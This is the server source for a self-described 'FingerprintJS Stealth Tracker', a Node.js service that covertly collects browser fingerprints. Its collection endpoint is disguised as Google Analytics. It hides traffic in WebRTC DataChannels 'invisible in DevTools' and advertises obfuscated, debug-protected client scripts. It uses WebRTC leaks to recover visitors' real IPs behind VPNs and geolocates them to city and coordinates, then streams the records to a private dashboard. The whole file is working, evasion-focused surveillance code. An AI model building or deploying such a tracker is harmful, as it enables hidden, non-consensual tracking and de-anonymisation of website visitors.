require('dotenv').config()
const express    = require('express')
const http       = require('http')
const path       = require('path')
const fs         = require('fs')
const crypto     = require('crypto')
const cors       = require('cors')
const helmet     = require('helmet')
const rateLimit  = require('express-rate-limit')
const cookieParser = require('cookie-parser')
const { Server: SocketServer } = require('socket.io')
const dc         = require('node-datachannel')
const db         = require('./db')

dc.initLogger('Fatal', () => {}) // suppress verbose datachannel logs

const app        = express()
const httpServer = http.createServer(app)
const io         = new SocketServer(httpServer, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
})
const PORT = parseInt(process.env.PORT, 10) || 3000

// Trust reverse proxy for X-Forwarded-* headers (required on Render)
app.set('trust proxy', 1)

app.use(cors())
app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: true,
    reportOnly: true
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}))
app.use(cookieParser())
app.use(express.json({ limit: '2mb' }))
app.use(express.static(path.join(__dirname, 'public')))

// ── Health Check (for Render zero-downtime deploys) ───────────────────────────
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    uptime: Math.floor(process.uptime()),
    timestamp: new Date().toISOString(),
    database: db.isTurso() ? 'turso_libsql' : 'local_sqlite'
  })
})

// ── Cryptography & Key Management (Phase 5) ──────────────────────────────────
const { generateKeyPairSync, privateDecrypt, constants } = crypto;
const KEY_DIR = process.env.KEY_DIR || path.join(__dirname, '.keys');
if (!fs.existsSync(KEY_DIR)) {
  try { fs.mkdirSync(KEY_DIR, { recursive: true }); } catch (e) {}
}

let currentPrivateKey, currentPublicKey, spkiBase64, rsaKeyId;

function loadOrGenerateKeys() {
  const privPath = path.join(KEY_DIR, 'private.pem');
  const pubPath = path.join(KEY_DIR, 'public.pem');
  const idPath = path.join(KEY_DIR, 'key_id.txt');

  if (process.env.PRIVATE_KEY_PEM && process.env.PUBLIC_KEY_PEM && process.env.KEY_ID) {
    currentPrivateKey = crypto.createPrivateKey(process.env.PRIVATE_KEY_PEM);
    currentPublicKey = crypto.createPublicKey(process.env.PUBLIC_KEY_PEM);
    rsaKeyId = process.env.KEY_ID;
    spkiBase64 = currentPublicKey.export({ type: 'spki', format: 'der' }).toString('base64');
  } else if (fs.existsSync(privPath) && fs.existsSync(pubPath) && fs.existsSync(idPath)) {
    currentPrivateKey = crypto.createPrivateKey(fs.readFileSync(privPath));
    currentPublicKey = crypto.createPublicKey(fs.readFileSync(pubPath));
    rsaKeyId = fs.readFileSync(idPath, 'utf8').trim();
    spkiBase64 = currentPublicKey.export({ type: 'spki', format: 'der' }).toString('base64');
  } else {
    rsaKeyId = 'prod-key-' + Date.now();
    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
      modulusLength: 3072
    });
    currentPrivateKey = privateKey;
    currentPublicKey = publicKey;
    spkiBase64 = publicKey.export({ type: 'spki', format: 'der' }).toString('base64');
    
    try {
      fs.writeFileSync(privPath, privateKey.export({ type: 'pkcs1', format: 'pem' }));
      fs.writeFileSync(pubPath, publicKey.export({ type: 'spki', format: 'pem' }));
      fs.writeFileSync(idPath, rsaKeyId);
    } catch (e) {
      console.warn("Notice: Ephemeral keys in memory (could not write to KEY_DIR)");
    }
  }
}
loadOrGenerateKeys();

app.get('/crypto/public-key', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.json({
    keyId: rsaKeyId,
    version: '1.0',
    algorithm: 'RSA-OAEP-SHA256',
    publicKey: spkiBase64
  });
});

// ── API Key ───────────────────────────────────────────────────────────────────
const KEY_FILE = path.join(__dirname, '.api_key')
let API_KEY

if (process.env.API_KEY) {
  API_KEY = process.env.API_KEY
} else if (fs.existsSync(KEY_FILE)) {
  API_KEY = fs.readFileSync(KEY_FILE, 'utf8').trim()
} else {
  API_KEY = crypto.randomBytes(24).toString('hex')
  try { fs.writeFileSync(KEY_FILE, API_KEY) } catch(e) {}
}

// Hourly database cleanup
setInterval(async () => {
  try {
    const now = Date.now();
    await db.cleanupNonces(now);
    await db.cleanupSessions(now);
    await db.cleanupFingerprints();
  } catch (e) {
    console.error('Database maintenance error:', e.message);
  }
}, 60 * 60 * 1000);

// ── SSE ───────────────────────────────────────────────────────────────────────
let sseClients = []

function broadcast(entry) {
  const line = `data: ${JSON.stringify(entry)}\n\n`
  sseClients.forEach(res => { try { res.write(line) } catch {} })
}

// ── Auth ──────────────────────────────────────────────────────────────────────
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Limit each IP to 5 login requests per windowMs
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many login attempts, please try again later.' }
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { key } = req.body;
  if (key === API_KEY) {
    const sessionToken = crypto.randomBytes(32).toString('hex');
    const expiresAt = Date.now() + (24 * 60 * 60 * 1000); // 24 hours
    await db.insertSession(sessionToken, expiresAt);
    
    res.cookie('auth_token', sessionToken, { 
      httpOnly: true, 
      sameSite: 'strict', 
      secure: req.secure // Trusted via 'trust proxy 1'
    });
    res.json({ ok: true });
  } else {
    res.status(401).json({ error: 'Unauthorized' });
  }
});

app.post('/api/logout', async (req, res) => {
  const token = req.cookies.auth_token;
  if (token) await db.deleteSession(token);
  res.clearCookie('auth_token');
  res.json({ ok: true });
});

async function requireKey(req, res, next) {
  const token = req.cookies.auth_token || req.headers['authorization']?.replace('Bearer ', '');
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  
  // Backwards compatibility for Bearer <API_KEY> (for API access, not cookie)
  if (req.headers['authorization'] && token === API_KEY) {
    return next();
  }
  
  const valid = await db.checkSession(token, Date.now());
  if (!valid) {
    res.clearCookie('auth_token');
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next()
}

// ── Routes ────────────────────────────────────────────────────────────────────

const collectLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 30, // Test limit: 30 requests per minute
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later.' }
});

// Looks identical to Google Analytics collect
app.post('/collect', collectLimiter, async (req, res) => {
  console.log("[DEBUG] Received POST /collect");
  const env = req.body;
  if (!env) {
    console.log("[DEBUG] Error: req.body is missing");
    return res.status(400).json({ error: 'Invalid encrypted payload' });
  }
  if (env.version !== '1.0' || env.keyId !== rsaKeyId || !env.iv || !env.encryptedKey || !env.ciphertext || !env.nonce || !env.ts) {
    console.log("[DEBUG] Error: Invalid envelope fields or mismatch keyId");
    return res.status(400).json({ error: 'Invalid encrypted payload' });
  }

  // 1. Message Age Validation (Max 5 minutes old) to permanently solve Replay attacks
  const msgTime = parseInt(env.ts, 10);
  if (isNaN(msgTime) || Date.now() - msgTime > 5 * 60 * 1000 || msgTime > Date.now() + 60000) {
    console.log("[DEBUG] Error: Payload expired or invalid timestamp");
    return res.status(400).json({ error: 'Payload expired' });
  }

  // 2. Nonce Validation (Atomic insertion)
  try {
    await db.insertNonce(env.nonce, Date.now() + (60 * 60 * 1000));
  } catch (err) {
    if (err.message.includes('UNIQUE constraint failed') ||
        err.code === 'ERR_SQLITE_CONSTRAINT_PRIMARYKEY' ||
        err.code === 'SQLITE_CONSTRAINT_PRIMARYKEY' ||
        err.message.includes('SQLITE_CONSTRAINT')) {
      console.log("[DEBUG] Error: Replay detected");
      return res.status(400).json({ error: 'Replay detected' });
    }
    throw err;
  }

  let decryptedJsonStr = '';
  try {
    const iv = Buffer.from(env.iv, 'base64url');
    if (iv.length !== 12) throw new Error('Invalid IV length');
    
    const encKeyBuf = Buffer.from(env.encryptedKey, 'base64url');
    const aesKey = privateDecrypt({
      key: currentPrivateKey,
      padding: constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256'
    }, encKeyBuf);
    
    if (aesKey.length !== 32) throw new Error('Invalid AES key length');

    const ciphertextBuffer = Buffer.from(env.ciphertext, 'base64url');
    if (ciphertextBuffer.length < 16) throw new Error('Invalid ciphertext length');
    const authTag = ciphertextBuffer.subarray(ciphertextBuffer.length - 16);
    const actualCiphertext = ciphertextBuffer.subarray(0, ciphertextBuffer.length - 16);

    const decipher = crypto.createDecipheriv('aes-256-gcm', aesKey, iv);
    decipher.setAuthTag(authTag);
    const aad = Buffer.from(`version=${env.version}&keyId=${env.keyId}&nonce=${env.nonce}&ts=${env.ts}`, 'utf8');
    decipher.setAAD(aad);

    let dec = decipher.update(actualCiphertext);
    dec = Buffer.concat([dec, decipher.final()]);
    decryptedJsonStr = dec.toString('utf8');
  } catch(e) {
    console.log("[DEBUG] Decryption failed:", e.message);
    return res.status(400).json({ error: 'Decryption failed' });
  }

  let decryptedBody;
  try {
    decryptedBody = JSON.parse(decryptedJsonStr);
  } catch(e) {
    console.log("[DEBUG] Invalid JSON schema after decryption");
    return res.status(400).json({ error: 'Invalid JSON schema' });
  }

  console.log("[DEBUG] Decryption successful!");
  req.body = decryptedBody;
  const httpIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  
  let isVpn = false;
  let vpnReasons = [];
  
  if (req.body && req.body.rtc) {
    const rtc = req.body.rtc;
    const srflxIps = rtc.filter(i => i.includes('srflx')).map(i => i.split(' ')[0]);
    const hostIps = rtc.filter(i => i.includes('host'));
    
    if (srflxIps.length > 0 && !srflxIps.includes(httpIp) && httpIp !== '::1' && httpIp !== '127.0.0.1') {
      isVpn = true;
      vpnReasons.push('WebRTC Bypass: HTTP IP hides behind proxy, true IP leaked');
    }
    if (srflxIps.length > 1) {
      isVpn = true;
      vpnReasons.push('Multi-Routing: Split-tunneling or dual-gateway active');
    }
    if (hostIps.length > 1) {
      isVpn = true;
      vpnReasons.push('Adapter Anomaly: Virtual VPN TAP/TUN adapter detected');
    }
    if (rtc.length === 0) {
      isVpn = true;
      vpnReasons.push('WebRTC Blocked: Strict UDP firewall or VPN killswitch active');
    }
  }

  // Deep Timezone & Offline IP Resolution for ALL IPs (HTTP + srflx)
  const resolved_ips = [];
  try {
    const geoip = require('geoip-lite');
    
    const resolveIp = (ipStr, source) => {
      if (!ipStr || ipStr === '::1' || ipStr === '127.0.0.1') return;
      if (resolved_ips.find(r => r.ip === ipStr)) return;
      
      const g = geoip.lookup(ipStr);
      if (g) {
        resolved_ips.push({
          ip: ipStr,
          source: source,
          city: g.city || null,
          region: g.region || null,
          country: g.country || null,
          latitude: g.ll ? g.ll[0] : null,
          longitude: g.ll ? g.ll[1] : null,
          timezone: g.timezone || null
        });
        
        if (req.body && req.body.tm && req.body.tm.tz) {
           const browserTz = req.body.tm.tz;
           if (g.timezone && browserTz !== g.timezone) {
              isVpn = true;
              vpnReasons.push(`Timezone Mismatch (${source} IP): IP is in ${g.timezone} but System is ${browserTz}`);
           }
        }
      }
    };

    resolveIp(httpIp, 'http');
    if (req.body && req.body.rtc) {
      const srflxIps = req.body.rtc.filter(i => i.includes('srflx')).map(i => i.split(' ')[0]);
      srflxIps.forEach(ip => resolveIp(ip, 'srflx'));
    }
  } catch(e) {}

  const entry = {
    id        : crypto.randomBytes(8).toString('hex'),
    timestamp : new Date().toISOString(),
    ip        : httpIp,
    userAgent : req.headers['user-agent'] || '',
    referer   : req.headers['referer'] || '',
    vpn_leak  : { detected: isVpn, reasons: [...new Set(vpnReasons)] },
    ip_addresses: resolved_ips,
    data      : req.body,
  }

  await db.insertFingerprint(
    entry.id, entry.timestamp, entry.ip, entry.userAgent, entry.referer,
    entry.vpn_leak, entry.ip_addresses, entry.data
  );
  
  broadcast(entry)

  // 204 No Content — standard stealth response
  res.status(204).end()
})

// SSE realtime stream
app.get('/events', requireKey, async (req, res) => {
  res.setHeader('Content-Type',  'text/event-stream')
  res.setHeader('Cache-Control', 'no-cache')
  res.setHeader('Connection',    'keep-alive')
  res.setHeader('X-Accel-Buffering', 'no')
  res.flushHeaders()

  const fps = await db.getFingerprints(100);
  fps.reverse().forEach(fp => {
    res.write(`data: ${JSON.stringify({ ...fp, _history: true })}\n\n`)
  })

  const hb = setInterval(() => { try { res.write(': hb\n\n') } catch {} }, 20000)
  sseClients.push(res)
  req.on('close', () => {
    clearInterval(hb)
    sseClients = sseClients.filter(c => c !== res)
  })
})

app.get('/api/records', requireKey, async (req, res) => {
  const limit = Math.min(parseInt(req.query.limit, 10) || 200, 2000);
  const fps = await db.getFingerprints(limit);
  res.json(fps);
})

app.get('/api/records/:id', requireKey, async (req, res) => {
  const record = await db.getFingerprintById(req.params.id);
  if (record) {
    res.json(record)
  } else {
    res.status(404).json({ error: 'Record not found' })
  }
})

app.delete('/api/records', requireKey, async (req, res) => {
  // CSRF Protection for Cookie Auth: Require custom header
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  await db.clearFingerprints();
  broadcast({ _clear: true })
  res.json({ ok: true })
})

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'))
})

app.get('/dashboard', async (req, res) => {
  const token = req.cookies.auth_token;
  if (!token || !(await db.checkSession(token, Date.now()))) {
    return res.redirect('/login');
  }
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'))
})

// ── Startup & Graceful Shutdown ───────────────────────────────────────────────
async function startServer() {
  await db.init();
  const maskedKey = API_KEY ? (API_KEY.length > 8 ? `${API_KEY.slice(0, 4)}...${API_KEY.slice(-4)}` : '****') : 'none';

  // ── WebRTC DataChannel Signaling via Socket.io ────────────────────────────
  // All collect and crypto/public-key traffic is tunneled inside
  // WebRTC DataChannels — completely invisible in DevTools Network tab.
  io.on('connection', (socket) => {
    // node-datachannel uses {hostname, port, relayType} — NOT browser-style urls:[...]
    const turnUser = process.env.TURN_USERNAME || '';
    const turnPass = process.env.TURN_PASSWORD || '';
    const turnServers = (turnUser && turnPass) ? [
      { hostname: 'global.relay.metered.ca', port: 80,  username: turnUser, password: turnPass, relayType: 'TurnUdp' },
      { hostname: 'global.relay.metered.ca', port: 80,  username: turnUser, password: turnPass, relayType: 'TurnTcp' },
      { hostname: 'global.relay.metered.ca', port: 443, username: turnUser, password: turnPass, relayType: 'TurnTcp' },
      { hostname: 'global.relay.metered.ca', port: 443, username: turnUser, password: turnPass, relayType: 'TurnTls' }
    ] : [];
    const peer = new dc.PeerConnection('server', {
      iceServers: [
        { hostname: 'stun.metered.ca', port: 80 },
        ...turnServers
      ]
    });

    peer.onLocalDescription((sdp, type) => socket.emit('answer', { sdp, type }));
    peer.onLocalCandidate((candidate, mid) => socket.emit('candidate', { candidate, mid }));

    peer.onDataChannel((channel) => {
      channel.onMessage(async (rawMsg) => {
        let req;
        try { req = JSON.parse(rawMsg.toString()); } catch { return; }

        // Route 1: Browser requests the RSA public key
        if (req.type === 'getPublicKey') {
          channel.sendMessage(JSON.stringify({
            type: 'publicKey',
            keyId: rsaKeyId,
            version: '1.0',
            algorithm: 'RSA-OAEP-SHA256',
            publicKey: spkiBase64
          }));
          return;
        }

        // Route 2: Browser sends encrypted fingerprint payload
        if (req.type === 'collect') {
          const env = req.payload;
          if (!env || env.version !== '1.0' || env.keyId !== rsaKeyId ||
              !env.iv || !env.encryptedKey || !env.ciphertext || !env.nonce || !env.ts) {
            channel.sendMessage(JSON.stringify({ type: 'ack', status: 400, error: 'Invalid payload' }));
            return;
          }

          const msgTime = parseInt(env.ts, 10);
          if (isNaN(msgTime) || Date.now() - msgTime > 5 * 60 * 1000 || msgTime > Date.now() + 60000) {
            channel.sendMessage(JSON.stringify({ type: 'ack', status: 400, error: 'Expired' }));
            return;
          }

          try {
            await db.insertNonce(env.nonce, Date.now() + (60 * 60 * 1000));
          } catch (err) {
            if (err.message.includes('UNIQUE constraint failed') || err.message.includes('SQLITE_CONSTRAINT')) {
              channel.sendMessage(JSON.stringify({ type: 'ack', status: 400, error: 'Replay' }));
              return;
            }
            throw err;
          }

          let decryptedBody;
          try {
            const iv = Buffer.from(env.iv, 'base64url');
            if (iv.length !== 12) throw new Error('bad iv');
            const aesKey = privateDecrypt({
              key: currentPrivateKey,
              padding: constants.RSA_PKCS1_OAEP_PADDING,
              oaepHash: 'sha256'
            }, Buffer.from(env.encryptedKey, 'base64url'));
            const ctBuf = Buffer.from(env.ciphertext, 'base64url');
            const decipher = crypto.createDecipheriv('aes-256-gcm', aesKey, iv);
            decipher.setAuthTag(ctBuf.subarray(ctBuf.length - 16));
            const aad = Buffer.from(`version=${env.version}&keyId=${env.keyId}&nonce=${env.nonce}&ts=${env.ts}`, 'utf8');
            decipher.setAAD(aad);
            const dec = Buffer.concat([decipher.update(ctBuf.subarray(0, ctBuf.length - 16)), decipher.final()]);
            decryptedBody = JSON.parse(dec.toString('utf8'));
          } catch (e) {
            channel.sendMessage(JSON.stringify({ type: 'ack', status: 400, error: 'Decryption failed' }));
            return;
          }

          // Geo / VPN detection (same logic as HTTP /collect)
          const httpIp = socket.handshake.headers['x-forwarded-for']?.split(',')[0].trim() || socket.handshake.address || '';
          let isVpn = false, vpnReasons = [];
          const resolved_ips = [];
          if (decryptedBody.rtc) {
            const srflxIps = decryptedBody.rtc.filter(i => i.includes('srflx')).map(i => i.split(' ')[0]);
            const hostIps = decryptedBody.rtc.filter(i => i.includes('host'));
            if (srflxIps.length > 0 && !srflxIps.includes(httpIp) && httpIp !== '::1' && httpIp !== '127.0.0.1') {
              isVpn = true; vpnReasons.push('WebRTC Bypass: true IP leaked');
            }
            if (srflxIps.length > 1) { isVpn = true; vpnReasons.push('Multi-Routing detected'); }
            if (hostIps.length > 1)  { isVpn = true; vpnReasons.push('Adapter Anomaly'); }
            if (decryptedBody.rtc.length === 0) { isVpn = true; vpnReasons.push('WebRTC Blocked'); }
          }
          try {
            const geoip = require('geoip-lite');
            const resolveIp = (ipStr, src) => {
              if (!ipStr || ipStr === '::1' || ipStr === '127.0.0.1') return;
              if (resolved_ips.find(r => r.ip === ipStr)) return;
              const g = geoip.lookup(ipStr);
              if (g) {
                resolved_ips.push({ ip: ipStr, source: src, city: g.city, country: g.country, timezone: g.timezone, latitude: g.ll?.[0], longitude: g.ll?.[1] });
                if (decryptedBody.tm?.tz && g.timezone && decryptedBody.tm.tz !== g.timezone) {
                  isVpn = true;
                  vpnReasons.push(`Timezone Mismatch (${src}): ${g.timezone} vs ${decryptedBody.tm.tz}`);
                }
              }
            };
            resolveIp(httpIp, 'http');
            if (decryptedBody.rtc) {
              decryptedBody.rtc.filter(i => i.includes('srflx')).map(i => i.split(' ')[0]).forEach(ip => resolveIp(ip, 'srflx'));
            }
          } catch(e) {}

          const entry = {
            id: crypto.randomBytes(8).toString('hex'),
            timestamp: new Date().toISOString(),
            ip: httpIp,
            userAgent: socket.handshake.headers['user-agent'] || '',
            referer: socket.handshake.headers['referer'] || '',
            vpn_leak: { detected: isVpn, reasons: [...new Set(vpnReasons)] },
            ip_addresses: resolved_ips,
            data: decryptedBody,
            transport: 'webrtc'
          };

          await db.insertFingerprint(
            entry.id, entry.timestamp, entry.ip, entry.userAgent, entry.referer,
            entry.vpn_leak, entry.ip_addresses, entry.data
          );
          broadcast(entry);
          channel.sendMessage(JSON.stringify({ type: 'ack', status: 204 }));
        }
      });
    });

    socket.on('offer', ({ sdp, type }) => {
      try { peer.setRemoteDescription(sdp, type); } catch(e) {}
    });
    socket.on('candidate', ({ candidate, mid }) => {
      try { peer.addRemoteCandidate(candidate, mid); } catch(e) {}
    });
    socket.on('disconnect', () => {
      try { peer.close(); } catch(e) {}
    });
  });

  httpServer.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '─'.repeat(64))
    console.log('  🕵️  FingerprintJS Stealth Tracker')
    console.log('─'.repeat(64))
    console.log(`  🔑  API Key   : ${maskedKey}`)
    console.log(`  🗄️  Database  : ${db.isTurso() ? 'Turso Cloud libSQL' : 'Local SQLite'}`)
    console.log(`  📡  Gateway   : http://0.0.0.0:${PORT}/`)
    console.log(`  📊  Dashboard : http://0.0.0.0:${PORT}/dashboard (Login required)`)
    console.log(`  💚  Health    : http://0.0.0.0:${PORT}/health`)
    console.log(`  📡  WebRTC    : Socket.io signaling active`)
    console.log('─'.repeat(64))
    console.log('  🔒  ga.min.js → base64 string-array obfuscated')
    console.log('  🔒  t.js      → RC4 + control-flow + debug-protection')
    console.log('  🔒  DataChannel → WebRTC (invisible in DevTools)')
    console.log('─'.repeat(64) + '\n')
  });

  const shutdown = (signal) => {
    console.log(`\nReceived ${signal}. Shutting down cleanly...`);
    httpServer.close(async () => {
      await db.close();
      console.log('Server and database connections closed.');
      process.exit(0);
    });
  };

  process.on('SIGTERM', () => shutdown('SIGTERM'));
  process.on('SIGINT', () => shutdown('SIGINT'));
}

startServer().catch(err => {
  console.error("FATAL: Failed to start server:", err);
  process.exit(1);
});
